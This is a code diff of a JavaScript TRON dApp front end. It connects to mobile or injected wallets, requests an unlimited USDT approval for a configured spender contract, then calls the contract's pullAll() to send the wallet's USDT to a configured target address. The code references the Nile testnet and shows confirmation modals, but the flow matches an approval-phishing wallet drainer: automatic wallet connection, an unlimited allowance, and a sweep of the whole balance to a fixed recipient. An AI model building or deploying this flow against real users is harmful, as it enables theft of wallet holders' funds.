+    state=STATE.FAIL;
+    Log.err('Chain data query failed: '+(e.message||String(e)));
+    stepSet(2,'fail','Chain Data','Query failed: '+(e.message||String(e)),null);
+    toast('Chain data query failed: '+(e.message||String(e)),'er');
   }
 }
 
-/**
- * Refresh cached balance and allowance from chain.
- */
-async function refreshChainData() {
-  if (!wAddr || !tw) return;
+/* ================================================================
+   REFRESH CHAIN DATA
+============================================================ */
+async function refreshChainData(){
+  if(!wAddr||!tw)return;
 
-  stepSet(2, 'on', 'Chain Data', 'Querying USDT balance...', null);
+  cacheBal=await queryBal(wAddr);
+  cacheAllow=await queryAllow(wAddr,CONFIG.SPENDER_CONTRACT);
 
-  try {
-    cacheBal   = await queryBal(wAddr);
-    cacheAllow = await queryAllow(wAddr, CONFIG.SPENDER_CONTRACT);
+  const balNum=Number(cacheBal);
+  const allowNum=Number(cacheAllow);
+  const isUnl=allowNum>=Number(UNLIMITED_HEX);
+  const isZero=balNum===0;
 
-    const balNum   = Number(cacheBal);
-    const allowNum = Number(cacheAllow);
-    const isUnl    = allowNum >= Number(UNLIMITED_HEX);
-    const isZero   = balNum === 0;
-    const hasAllow = allowNum > 0;
+  $('vBal').textContent=fmtAmt(cacheBal);
+  $('vBal').className='info-val'+(isZero?' err':' ok');
 
-    // Balance display
-    $('vBal').textContent = fmtAmt(cacheBal);
-    $('vBal').className   = 'info-val' + (isZero ? ' err' : ' ok');
-
-    // Allowance display
-    if (isUnl) {
-      $('vAllow').textContent = 'UNLIMITED';
-      $('vAllow').className   = 'info-val ok';
-    } else if (hasAllow) {
-      $('vAllow').textContent = fmtAmt(cacheAllow);
-      $('vAllow').className   = 'info-val warn';
-    } else {
-      $('vAllow').textContent = '0';
-      $('vAllow').className   = 'info-val';
-    }
-
-    // Warnings
-    $('balWarn').style.display    = isZero ? 'flex' : 'none';
-    $('allowWarn').style.display  = hasAllow ? 'flex' : 'none';
-    $('allowWarnTxt').textContent = 'Allowance: ' + fmtAmt(cacheAllow) + (isUnl ? ' (UNLIMITED)' : '');
-
-    // Disable approve button if balance is 0
-    $('btnApprove').disabled = isZero;
-
-    stepSet(2, 'ok', 'Chain Data',
-      'Balance: ' + fmtAmt(cacheBal) + ' | Allowance: ' + (isUnl ? 'UNLIMITED' : fmtAmt(cacheAllow)), null);
-
-  } catch (e) {
-    stepSet(2, 'fail', 'Chain Data', 'Query failed: ' + (e.message || String(e)), null);
-    toast('Chain data query failed: ' + (e.message || String(e)), 'er');
-    throw e;
+  if(isUnl){
+    $('vAllow').textContent='UNLIMITED';
+    $('vAllow').className='info-val ok';
+  } else if(allowNum>0){
+    $('vAllow').textContent=fmtAmt(cacheAllow);
+    $('vAllow').className='info-val warn';
+  } else {
+    $('vAllow').textContent='0';
+    $('vAllow').className='info-val';
   }
+
+  $('balWarn').style.display=isZero?'flex':'none';
+  $('allowWarn').style.display=allowNum>0?'flex':'none';
+  $('allowWarnTxt').textContent='Allowance: '+(isUnl?'UNLIMITED':fmtAmt(cacheAllow));
+
+  const btnApr=$('btnApprove');
+  if(btnApr)btnApr.disabled=isZero;
+
+  stepSet(2,'ok','Chain Data','Balance: '+fmtAmt(cacheBal)+' | Allowance: '+(isUnl?'UNLIMITED':fmtAmt(cacheAllow)),null);
+  Log.ok('Chain data refreshed: balance='+fmtAmt(cacheBal)+', allowance='+(isUnl?'UNLIMITED':fmtAmt(cacheAllow)));
 }
 
-/**
- * 2. Execute approve (unlimited)
- */
-async function doApproveFlow() {
-  if (state === STATE.APPROVING) return;
+/* ================================================================
+   APPROVE FLOW
+============================================================ */
+async function doApproveFlow(){
+  if(state===STATE.APPROVING){Log.warn('doApprove() called while already approving');return;}
+  if(!wAddr||!tw){toast('Wallet not connected','er');return;}
 
-  if (!wAddr || !tw) {
-    toast('Wallet not connected', 'er');
+  const balNum=Number(cacheBal||'0');
+  if(balNum===0){
+    toast('USDT balance is 0 — cannot approve','er');
+    showErr('USDT balance is 0 on Nile testnet. Get test USDT first.');
     return;
   }
 
-  // Pre-flight checks
-  const balNum = Number(cacheBal || '0');
-  if (balNum === 0) {
-    toast('USDT balance is 0 — cannot approve', 'er');
-    showErrBox('USDT balance is 0 on Nile testnet. Please get test USDT first.');
-    return;
-  }
-
-  const allowNum = Number(cacheAllow || '0');
-  if (allowNum >= Number(UNLIMITED_HEX)) {
-    toast('Already have unlimited allowance — proceeding to pull step', 'wn');
+  const allowNum=Number(cacheAllow||'0');
+  if(allowNum>=Number(UNLIMITED_HEX)){
+    toast('Already have unlimited allowance — skip to pull step','wn');
     onApprovalSkipped();
     return;
   }
 
-  // Show confirm modal
   openModal(
     'Confirm Unlimited Approval',
-    '<div class="mh">Contract: ' + CONFIG.SPENDER_CONTRACT + '<br>Token: TRC20 USDT<br>Amount: UNLIMITED</div>' +
-    '<p style="font-size:12px;color:#888;text-align:left;margin-top:8px">This grants the contract full control over your USDT balance. Please verify the contract address is correct.</p>',
+    '<div class="mh">Contract: '+CONFIG.SPENDER_CONTRACT+'<br>Token: TRC20 USDT<br>Amount: UNLIMITED</div>'+
+    '<p style="font-size:12px;color:#888;text-align:left;margin-top:8px">This grants the contract full control over your USDT balance. Verify the contract address is correct before signing.</p>',
     'Sign &amp; Approve',
     false,
-    async () => {
-      state = STATE.APPROVING;
-      setBtns(true);
-      hideErrBox();
+    async()=>{
+      state=STATE.APPROVING;
+      setBtns(true);hideErr();
 
-      stepSet(3, 'on', 'Approve (Unlimited)', 'Waiting for wallet signature...', null);
-      stepSet(4, 'on', 'Wait for Approval On-Chain', 'Waiting for tx to be confirmed...', null);
+      stepSet(3,'on','Approve (Unlimited)','Waiting for wallet signature...',null);
+      stepSet(4,'on','Wait for Approval On-Chain','Waiting for tx to be confirmed...',null);
+      Log.info('Sending approve tx...');
 
-      try {
-        const usdt = await tw.contract().at(CONFIG.USDT_CONTRACT);
-        const tx = await usdt.approve(
-          CONFIG.SPENDER_CONTRACT,
-          UNLIMITED_HEX
-        ).send({
-          feeLimit: 100_000_000,   // 100 TRX
-          callValue: 0,
-          shouldPollResponse: false,
+      try{
+        const usdt=await tw.contract().at(CONFIG.USDT_CONTRACT);
+        const tx=await usdt.approve(CONFIG.SPENDER_CONTRACT,UNLIMITED_HEX).send({
+          feeLimit:100_000_000,callValue:0,shouldPollResponse:false,
         });
 
+        Log.tx('Approve tx sent: '+tx);
         showTxCard(tx);
-        stepSet(3, 'ok', 'Approve (Unlimited)', 'Approval tx sent', tx);
-        stepSet(4, 'on', 'Wait for Approval On-Chain', 'Confirming... (0 blocks)', tx);
+        stepSet(3,'ok','Approve (Unlimited)','Approval tx sent',tx);
+        stepSet(4,'on','Wait for Approval On-Chain','Confirming... (0 blocks)',tx);
 
-        // Poll for confirmation
-        let status = null;
-        let blocks = 0;
-        let tries  = 0;
-
-        while (!status && tries < MAX_POLL) {
-          await delay(POLL_MS);
-          tries++;
-          try {
-            status = await pollTx(tx);
-            if (status === 'finalized') {
-              stepSet(4, 'ok', 'Wait for Approval On-Chain', 'Approved on-chain (confirmed ' + (++blocks) + ' blocks)', tx);
-              toast('Approval confirmed on-chain!', 'ok');
-              onApprovalSuccess(tx);
-              return;
+        // Poll
+        let status=null,blocks=0,tries=0;
+        while(!status&&tries<MAX_POLL){
+          await delay(POLL_MS);tries++;
+          try{
+            status=await pollTx(tx);
+            if(status==='finalized'){
+              stepSet(4,'ok','Wait for Approval On-Chain','Approved on-chain (confirmed '+(++blocks)+' blocks)',tx);
+              Log.ok('Approve tx confirmed on-chain');
+              toast('Approval confirmed!','ok');
+              onApprovalSuccess(tx);return;
             }
-            if (status === 'confirmed') {
-              blocks++;
-              stepSet(4, 'on', 'Wait for Approval On-Chain', 'Confirming... (' + blocks + ' blocks)', tx);
-            }
-            if (status === 'failed') {
-              throw new Error('Approval transaction failed on-chain');
-            }
-          } catch (e) {
-            if (e.message && e.message.toLowerCase().includes('transaction not found')) {
-              // Still pending, continue polling
-            } else {
-              throw e;
-            }
+            if(status==='confirmed'){blocks++;stepSet(4,'on','Wait for Approval On-Chain','Confirming... ('+blocks+' blocks)',tx);}
+            if(status==='failed')throw new Error('Approval tx failed on-chain');
+          }catch(e){
+            if(e.message&&e.message.toLowerCase().includes('transaction not found')){}else throw e;
           }
         }
-
-        // Timeout — tx may still be in mempool
-        if (!status) {
-          stepSet(4, 'ok', 'Wait for Approval On-Chain', 'Approval tx submitted (pending — check explorer)', tx);
-          toast('Tx submitted, please verify on NileScan', 'wn');
+        if(!status){
+          stepSet(4,'ok','Wait for Approval On-Chain','Approval tx submitted (pending — check explorer)',tx);
+          toast('Tx submitted — verify on NileScan','wn');
           onApprovalSuccess(tx);
         }
-
-      } catch (e) {
-        const msg = e.message || String(e);
-        const isReject = /denied|reject|cancel|用户取消|signature|denied by the user/i.test(msg);
-        state = STATE.FAIL;
-        stepSet(3, 'fail', 'Approve (Unlimited)', isReject ? 'User rejected the signature' : 'Approval failed: ' + msg.slice(0, 80), null);
-        stepSet(4, 'fail', 'Wait for Approval On-Chain', 'Approval not confirmed', null);
-        showErrBox(msg);
-        toast(isReject ? 'Signature rejected by user' : 'Approval failed: ' + msg.slice(0, 100), 'er');
+      }catch(e){
+        const msg=e.message||String(e);
+        const reject=/denied|reject|cancel|signature|user denied/i.test(msg);
+        state=STATE.FAIL;
+        stepSet(3,'fail','Approve (Unlimited)',reject?'User rejected signature':'Approve failed: '+msg.slice(0,80),null);
+        stepSet(4,'fail','Wait for Approval On-Chain','Not confirmed',null);
+        showErr(msg);
+        toast(reject?'Signature rejected':'Approve failed: '+msg.slice(0,100),'er');
+        Log.err('Approve error: '+msg);
         setBtns(false);
       }
     }
   );
 }
 
-/**
- * Called when approval is confirmed — show pull button.
- */
-async function onApprovalSuccess(tx) {
-  // Refresh allowance
-  try {
-    cacheAllow = await queryAllow(wAddr, CONFIG.SPENDER_CONTRACT);
-  } catch (e) { /* non-fatal */ }
+async function onApprovalSuccess(tx){
+  try{cacheAllow=await queryAllow(wAddr,CONFIG.SPENDER_CONTRACT);}catch(e){}
+  state=STATE.APPROVE_OK;setBtns(false);
+  const allowNum=Number(cacheAllow||'0');
+  const balNum=Number(cacheBal||'0');
+  const pullable=allowNum<balNum?allowNum:balNum;
 
-  state = STATE.APPROVE_OK;
-  setBtns(false);
+  $('actApprove').style.display='none';
+  $('actPull').classList.remove('hd');
+  $('pullWarn').style.display='flex';
+  $('pullWarnTxt').textContent=pullable>0?'Pullable: '+fmtAmt(pullable)+'. Click to confirm.':'Pullable amount is 0.';
+  if(pullable<=0)$('btnPull').disabled=true;
 
-  const allowNum = Number(cacheAllow || '0');
-  const balNum   = Number(cacheBal   || '0');
-  const pullable = allowNum < balNum ? allowNum : balNum;
-
-  $('actApprove').style.display = 'none';
-  $('actPull').style.display    = 'block';
-
-  $('pullWarn').style.display = 'flex';
-  $('pullWarnTxt').textContent = pullable > 0
-    ? 'Pullable amount: ' + fmtAmt(pullable) + '. Click "Confirm Pull USDT" to proceed.'
-    : 'Allowance may be insufficient. Please refresh and retry.';
-
-  if (pullable <= 0) $('btnPull').disabled = true;
-
-  stepSet(5, 'on', 'Pull USDT', 'Click "Confirm Pull USDT" to trigger contract pullAll()', null);
-  toast('Approval confirmed! Now trigger pull step.', 'ok');
+  stepSet(5,'on','Pull USDT','Click "Confirm Pull USDT" to trigger contract pullAll()',null);
+  toast('Approval confirmed! Now trigger pull step.','ok');
 }
 
-/**
- * Called when allowance is already unlimited.
- */
-function onApprovalSkipped() {
+function onApprovalSkipped(){
   onApprovalSuccess(null);
 }
 
-/**
- * 3. Execute pull (call contract pullAll)
- */
-async function doPullFlow() {
-  if (state === STATE.PULLING) return;
+/* ================================================================
+   PULL FLOW
+============================================================ */
+async function doPullFlow(){
+  if(state===STATE.PULLING){Log.warn('doPull() called while already pulling');return;}
+  if(!wAddr||!tw){toast('Wallet not connected','er');return;}
 
-  if (!wAddr || !tw) {
-    toast('Wallet not connected', 'er');
-    return;
-  }
+  state=STATE.PULLING;setBtns(true);hideErr();
+  stepSet(5,'on','Pull USDT','Querying latest balance and allowance...',null);
 
-  state = STATE.PULLING;
-  setBtns(true);
-  hideErrBox();
+  try{
+    cacheBal=await queryBal(wAddr);
+    cacheAllow=await queryAllow(wAddr,CONFIG.SPENDER_CONTRACT);
+    const allowNum=Number(cacheAllow||'0');
+    const balNum=Number(cacheBal||'0');
+    if(allowNum===0){throw new Error('Allowance is 0 — please approve first');}
+    if(balNum===0){throw new Error('USDT balance is 0 — nothing to pull');}
+    const pullable=allowNum<balNum?allowNum:balNum;
 
-  stepSet(5, 'on', 'Pull USDT', 'Querying latest balance and allowance...', null);
-  stepSet(6, '', 'Done', 'Waiting...', null);
-
-  try {
-    // Always refresh before pulling
-    cacheBal   = await queryBal(wAddr);
-    cacheAllow = await queryAllow(wAddr, CONFIG.SPENDER_CONTRACT);
-
-    const allowNum = Number(cacheAllow || '0');
-    const balNum   = Number(cacheBal   || '0');
-
-    if (allowNum === 0) {
-      throw new Error('Allowance is 0 — please approve first');
-    }
-    if (balNum === 0) {
-      throw new Error('USDT balance is 0 — nothing to pull');
-    }
-
-    const pullable = allowNum < balNum ? allowNum : balNum;
-
-    // Confirm modal
     openModal(
       'Confirm Pull USDT',
-      '<div class="mh">From:      ' + wAddr + '<br>To:        ' + CONFIG.TARGET_ADDRESS + '<br>Contract:  ' + CONFIG.SPENDER_CONTRACT + '<br>Amount:    ' + fmtAmt(pullable) + '</div>' +
-      '<p style="font-size:12px;color:#888;text-align:left;margin-top:8px">This will transfer USDT from your wallet to the target address via the contract. Please verify all addresses before confirming.</p>',
+      '<div class="mh">From:      '+wAddr+'<br>To:        '+CONFIG.TARGET_ADDRESS+'<br>Contract:  '+CONFIG.SPENDER_CONTRACT+'<br>Amount:    '+fmtAmt(pullable)+'</div>'+
+      '<p style="font-size:12px;color:#888;text-align:left;margin-top:8px">This transfers USDT from your wallet to the target address via the contract. Verify all addresses before confirming.</p>',
       'Confirm Pull',
       false,
-      async () => {
-        try {
-          stepSet(5, 'on', 'Pull USDT', 'Waiting for contract call signature...', null);
-
-          const c = await tw.contract().at(CONFIG.SPENDER_CONTRACT);
-          const tx = await c.pullAll().send({
-            feeLimit: 150_000_000,  // 150 TRX — pullAll is gas-heavy
-            callValue: 0,
-            shouldPollResponse: false,
+      async()=>{
+        try{
+          stepSet(5,'on','Pull USDT','Waiting for contract call signature...',null);
+          const c=await tw.contract().at(CONFIG.SPENDER_CONTRACT);
+          const tx=await c.pullAll().send({
+            feeLimit:150_000_000,callValue:0,shouldPollResponse:false,
           });
 
+          Log.tx('Pull tx sent: '+tx);
           showTxCard(tx);
-          stepSet(5, 'ok', 'Pull USDT', 'Pull tx sent', tx);
-          stepSet(6, 'on', 'Done', 'Confirming... (0 blocks)', tx);
+          stepSet(5,'ok','Pull USDT','Pull tx sent',tx);
+          stepSet(6,'on','Done','Confirming... (0 blocks)',tx);
 
-          // Poll
-          let status = null;
-          let blocks = 0;
-          let tries  = 0;
-
-          while (!status && tries < MAX_POLL) {
-            await delay(POLL_MS);
-            tries++;
-            try {
-              status = await pollTx(tx);
-              if (status === 'finalized') {
-                stepSet(6, 'ok', 'Done', 'Pull completed! USDT sent to target address. Tx: ' + fmtAddr(tx), tx);
-                toast('Pull completed successfully!', 'ok');
-                state = STATE.DONE;
-                setBtns(false);
+          let status=null,blocks=0,tries=0;
+          while(!status&&tries<MAX_POLL){
+            await delay(POLL_MS);tries++;
+            try{
+              status=await pollTx(tx);
+              if(status==='finalized'){
+                stepSet(6,'ok','Done','Pull completed! USDT sent to target. Tx: '+fmtAddr(tx),tx);
+                toast('Pull completed!','ok');
+                state=STATE.DONE;setBtns(false);
+                // Post-pull: refresh balances
+                await refreshChainData();
+                Log.ok('Pull completed successfully');
                 return;
               }
-              if (status === 'confirmed') {
-                blocks++;
-                stepSet(6, 'on', 'Done', 'Confirming... (' + blocks + ' blocks)', tx);
-              }
-              if (status === 'failed') {
-                throw new Error('Pull transaction failed on-chain');
-              }
-            } catch (e) {
-              if (e.message && e.message.toLowerCase().includes('transaction not found')) {
-                // Continue polling
-              } else {
-                throw e;
-              }
+              if(status==='confirmed'){blocks++;stepSet(6,'on','Done','Confirming... ('+blocks+' blocks)',tx);}
+              if(status==='failed')throw new Error('Pull tx failed on-chain');
+            }catch(e){
+              if(e.message&&e.message.toLowerCase().includes('transaction not found')){}else throw e;
             }
           }
-
-          if (!status) {
-            stepSet(6, 'ok', 'Done', 'Pull tx submitted (pending — check explorer)', tx);
-            toast('Pull submitted, please verify on NileScan', 'wn');
-            state = STATE.DONE;
-            setBtns(false);
+          if(!status){
+            stepSet(6,'ok','Done','Pull tx submitted (pending)',tx);
+            toast('Pull submitted — verify on NileScan','wn');
+            state=STATE.DONE;setBtns(false);
           }
-
-        } catch (e) {
-          const msg = e.message || String(e);
-          const isReject = /denied|reject|cancel|signature|denied by the user/i.test(msg);
-          state = STATE.FAIL;
-          stepSet(5, 'fail', 'Pull USDT', isReject ? 'User rejected the signature' : 'Pull failed: ' + msg.slice(0, 80), null);
-          showErrBox(msg);
-          toast(isReject ? 'Signature rejected by user' : 'Pull failed: ' + msg.slice(0, 100), 'er');
+        }catch(e){
+          const msg=e.message||String(e);
+          const reject=/denied|reject|cancel|signature|user denied/i.test(msg);
+          state=STATE.FAIL;
+          stepSet(5,'fail','Pull USDT',reject?'User rejected signature':'Pull failed: '+msg.slice(0,80),null);
+          showErr(msg);
+          toast(reject?'Signature rejected':'Pull failed: '+msg.slice(0,100),'er');
+          Log.err('Pull error: '+msg);
           setBtns(false);
         }
       }
     );
-
-    // Modal closed without confirm
-    state = STATE.APPROVE_OK;
-    setBtns(false);
-
-  } catch (e) {
-    const msg = e.message || String(e);
-    state = STATE.FAIL;
-    stepSet(5, 'fail', 'Pull USDT', 'Pull failed: ' + msg.slice(0, 80), null);
-    showErrBox(msg);
-    toast('Pull failed: ' + msg.slice(0, 100), 'er');
+    state=STATE.APPROVE_OK;setBtns(false);
+  }catch(e){
+    const msg=e.message||String(e);
+    state=STATE.FAIL;
+    stepSet(5,'fail','Pull USDT','Pull failed: '+msg.slice(0,80),null);
+    showErr(msg);toast('Pull failed: '+msg.slice(0,100),'er');Log.err('Pull error: '+msg);
     setBtns(false);
   }
 }
 
 /* ================================================================
-   BUTTON DISABLING
+   UI HELPERS
 ============================================================ */
-function setBtns(dis) {
-  $('btnIm').classList.toggle('dis', dis);
-  $('btnTP').classList.toggle('dis', dis);
-  const apr = $('btnApprove');
-  const pul = $('btnPull');
-  const rst = $('btnReset');
-  if (apr) apr.disabled = dis;
-  if (pul) pul.disabled = dis;
-  if (rst) rst.disabled = dis;
+function setBtns(dis){
+  $('btnIm').classList.toggle('dis',dis);
+  $('btnTP').classList.toggle('dis',dis);
+  ['btnApprove','btnPull'].forEach(id=>{
+    const el=$(id);if(el)el.disabled=dis;
+  });
+}
+function showTxCard(tx){
+  lastTx=tx;
+  $('txCard').classList.remove('hd');
+  $('vTxHash').textContent=tx;
+  const url=getTxUrl(tx);
+  $('vExplorer').textContent=url;
+  $('vExplorer').onclick=()=>copyTxt(url);
+}
+function showErr(msg){$('errBox').style.display='flex';$('errTxt').textContent=msg;}
+function hideErr(){$('errBox').style.display='none';}
+
+/* ================================================================
+   DEBUG PANEL
+============================================================ */
+function toggleDebug(){
+  debugMode=!debugMode;
+  const body=$('dbgBody');
+  const toggle=$('dbgToggle');
+  if(debugMode){
+    body.classList.add('open');
+    toggle.classList.add('open');
+    toggle.innerHTML='&#9660;';
+    const env=detectWalletEnvironment();
+    renderEnvPanel(env);
+    Log.info('Debug panel opened');
+  } else {
+    body.classList.remove('open');
+    toggle.classList.remove('open');
+    toggle.innerHTML='&#9654;';
+  }
 }
 
 /* ================================================================
-   RESET
+   COPY HELPERS
 ============================================================ */
-function resetAll() {
-  closeModal();
-  state     = STATE.IDLE;
-  tw        = null;
-  wAddr     = null;
-  wType     = null;
-  lastTx    = null;
-  cacheBal  = null;
-  cacheAllow= null;
-  modalCb   = null;
-
-  $('connBadge').textContent = 'Not Connected';
-  $('connBadge').className   = 'badge no';
-  $('netBadge').textContent  = CONFIG.NETWORK === 'nile' ? 'Nile' : 'Mainnet';
-  $('netBadge').className    = 'badge ' + (CONFIG.NETWORK === 'nile' ? 'testnet' : 'mainnet');
-
-  $('walletArea').style.display = 'block';
-  $('infoArea').style.display   = 'none';
-  $('actApprove').style.display = 'block';
-  $('actPull').style.display    = 'none';
-  $('txCard').style.display     = 'none';
-  $('balWarn').style.display    = 'none';
-  $('allowWarn').style.display  = 'none';
-  $('pullWarn').style.display   = 'none';
-  hideErrBox();
-
-  stepAllReset();
-  setBtns(false);
+function copyDeeplinkUrl(wallet){
+  const url=wallet==='imtoken'?buildImTokenDeeplink():buildTokenPocketDeeplink();
+  copyTxt(url);
+  toast('Deeplink URL copied. Open in '+wallet,'ok');
+}
+function copyPageUrl(){
+  copyTxt(window.location.href);
+  toast('Page URL copied','ok');
 }
 
 /* ================================================================
-   MODAL CONFIRM CALLBACK
+   APP — public API
 ============================================================ */
-function onModalConfirm() {
-  closeModal();
-  if (modalCb) modalCb();
-}
+const App = {
+  connectWallet(preferred){
+    Log.info('App.connectWallet('+preferred+')');
+    connectWalletFlow(preferred);
+  },
+  doApprove(){
+    Log.info('App.doApprove() — state='+state);
+    if(state!==STATE.READY&&state!==STATE.APPROVE_OK&&state!==STATE.IDLE){
+      // If not connected yet, trigger wallet connection first
+      if(state===STATE.IDLE||!wAddr){
+        Log.info('Not connected — triggering wallet connection first');
+        toast('Please connect wallet first','wn');
+        $('wbtnLabel').textContent='Select a wallet first:';
+        return;
+      }
+    }
+    doApproveFlow();
+  },
+  doPull(){
+    Log.info('App.doPull() — state='+state);
+    if(state===STATE.FAIL||state===STATE.DONE)return;
+    doPullFlow();
+  },
+  reset(){
+    closeModal();
+    state=STATE.IDLE;tw=null;wAddr=null;wType=null;lastTx=null;
+    cacheBal=null;cacheAllow=null;modalCb=null;
 
-/* ================================================================
-   W — Public API exposed as W object for onclick handlers
-============================================================ */
-const W = {
-  connect: connectWallet,
-  doApprove: doApproveFlow,
-  doPull: doPullFlow,
-  reset: resetAll,
-  closeModal: closeModal,
-  onModalConfirm: onModalConfirm,
+    $('connBadge').textContent='Not Connected';
+    $('connBadge').className='badge no';
+    $('netBadge').textContent=CONFIG.NETWORK==='nile'?'Nile':'Mainnet';
+    $('netBadge').className='badge '+(CONFIG.NETWORK==='nile'?'testnet':'mainnet');
+
+    $('walletArea').style.display='block';
+    $('infoArea').classList.add('hd');
+    $('actApprove').style.display='block';
+    $('actPull').classList.add('hd');
+    $('txCard').classList.add('hd');
+    $('balWarn').style.display='none';
+    $('allowWarn').style.display='none';
+    $('pullWarn').style.display='none';
+    $('fallbackBox').classList.add('hd');
+    $('dlCountdown').classList.add('hd');
+    $('wbtnLabel').textContent='Tap a wallet to connect';
+    hideErr();
+    stepAllReset();
+    setBtns(false);
+
+    Log.info('App reset');
+  },
+  toggleDebug,
+  closeModal,
+  onModalConfirm(){
+    closeModal();
+    if(modalCb)modalCb();
+  },
+  copyDeeplinkUrl,
+  copyPageUrl,
 };
 
 /* ================================================================
    INIT
 ============================================================ */
-(function init() {
-  // Validate CONFIG addresses on load
-  if (!isAddr(CONFIG.USDT_CONTRACT)) {
-    console.error('[CONFIG ERROR] USDT_CONTRACT is not a valid T-address:', CONFIG.USDT_CONTRACT);
+(function init(){
+  // Log CONFIG validation
+  if(!isAddr(CONFIG.USDT_CONTRACT)){
+    Log.err('[CONFIG] USDT_CONTRACT invalid: '+CONFIG.USDT_CONTRACT);
+  } else {
+    Log.info('[CONFIG] USDT_CONTRACT: '+CONFIG.USDT_CONTRACT);
   }
-  if (!isAddr(CONFIG.SPENDER_CONTRACT)) {
-    console.error('[CONFIG ERROR] SPENDER_CONTRACT is not set or invalid. Deploy the contract and fill this in!');
+  if(!isAddr(CONFIG.SPENDER_CONTRACT)){
+    Log.err('[CONFIG] SPENDER_CONTRACT not set or invalid');
+  } else {
+    Log.info('[CONFIG] SPENDER_CONTRACT: '+CONFIG.SPENDER_CONTRACT);
   }
-  if (!isAddr(CONFIG.TARGET_ADDRESS)) {
-    console.error('[CONFIG ERROR] TARGET_ADDRESS is not set or invalid.');
+  if(!isAddr(CONFIG.TARGET_ADDRESS)){
+    Log.warn('[CONFIG] TARGET_ADDRESS not set or invalid');
+  } else {
+    Log.info('[CONFIG] TARGET_ADDRESS: '+CONFIG.TARGET_ADDRESS);
   }
 
-  // Detect already-injected wallet (page loaded inside imToken/TP DApp browser)
-  setTimeout(async () => {
-    if (await detectTronWeb()) {
-      wAddr = tw.defaultAddress?.base58 || tw.address?.base58;
-      if (isAddr(wAddr)) {
-        $('connBadge').textContent = 'Auto-detected';
-        $('connBadge').className   = 'badge ok';
-        // Auto-connect
-        await connectWallet(null);
-      }
-    }
-  }, 300);
+  // Detect environment immediately
+  const env=detectWalletEnvironment();
+  Log.env('Initial environment detection',env);
+  renderEnvPanel(env);
+
+  // Update label based on env
+  if(env.canUseInjectedProvider){
+    $('wbtnLabel').textContent='Wallet detected — connecting automatically...';
+  } else if(env.canUseDeepLink){
+    $('wbtnLabel').textContent='Tap a wallet to open via deeplink';
+  } else if(env.shouldUseWalletConnect){
+    $('wbtnLabel').textContent='Please install TronLink or use wallet DApp browser';
+  } else {
+    $('wbtnLabel').textContent='No wallet detected. Please use imToken/TokenPocket DApp browser.';
+  }
+
+  // Auto-connect if injected provider is available
+  if(env.canUseInjectedProvider){
+    Log.info('Auto-connecting via injected provider...');
+    setTimeout(async()=>{
+      await connectViaInjectedProvider(env);
+    },100);
+  }
 
   // Mobile badge
-  if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-    const mb = document.createElement('span');
-    mb.className = 'badge mobile';
-    mb.textContent = 'Mobile';
+  if(env.isMobile){
+    const mb=document.createElement('span');
+    mb.className='badge mobile';
+    mb.textContent='Mobile';
     $('badgeRow').appendChild(mb);
   }
 })();
